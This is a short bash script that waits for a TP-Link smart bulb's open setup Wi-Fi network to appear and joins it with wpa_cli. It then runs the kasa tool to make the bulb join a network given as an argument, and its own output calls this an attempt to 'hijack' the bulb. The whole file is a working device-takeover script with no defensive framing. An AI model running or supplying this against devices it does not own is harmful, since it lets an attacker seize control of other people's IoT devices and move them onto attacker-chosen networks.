#!/bin/bash

#echo "Starting at $(date)";

mac=$1;
net=$2;
mac=${mac^^};
name="TP-LINK_Smart Bulb_$mac"
echo "Starting at $(date) and looking for $name";

str=$(wpa_cli -i wlan0 scan_results|grep -e "$name"|tr -s ' '|cut -f 5);

for (( ; ; ))
do
	if [[ ! -z $str ]];
	then
		#echo $str;
		break;
	fi
	sleep 1;
	str=$(wpa_cli -i wlan0 scan_results|grep -e "$name"|tr -s ' '|cut -f 5);
done

# connect and control

echo "Bulb seen at $(date); Attempting to hijack..."

wpa_cli -i wlan0 disable_network 0 >/dev/null

sleep 1;

wpa_cli -i wlan0 remove_network 1 >/dev/null

wpa_cli -i wlan0 add_network > /dev/null


#wpa_cli -i wlan0 set_network 1 ssid '"TP-LINK_Smart Bulb_C0B7"'
#echo "wpa_cli -i wlan0 set_network 1 ssid "\""$name""\""
wpa_cli -i wlan0 set_network 1 ssid "\""$name""\" >/dev/null
wpa_cli -i wlan0 set_network 1 key_mgmt NONE >/dev/null 
wpa_cli -i wlan0 enable_network 1 >/dev/null

#wpa_cli -i wlan0 list_networks


str="$(ifconfig wlan0|grep "192.168.0.1"|tr -s ' '|cut -f 3 -d ' ')";
for (( ; ; ))
do
	if [[ ! -z $str ]];
	then
		#echo $str;
		break;
	fi
	str="$(ifconfig wlan0|grep "192.168.0.1"|tr -s ' '|cut -f 3 -d ' ')";
	sleep 1;
done

#echo "IP address is $str; asking bulb to join $net";

kasa --host 192.168.0.1 wifi join $net;

exit;
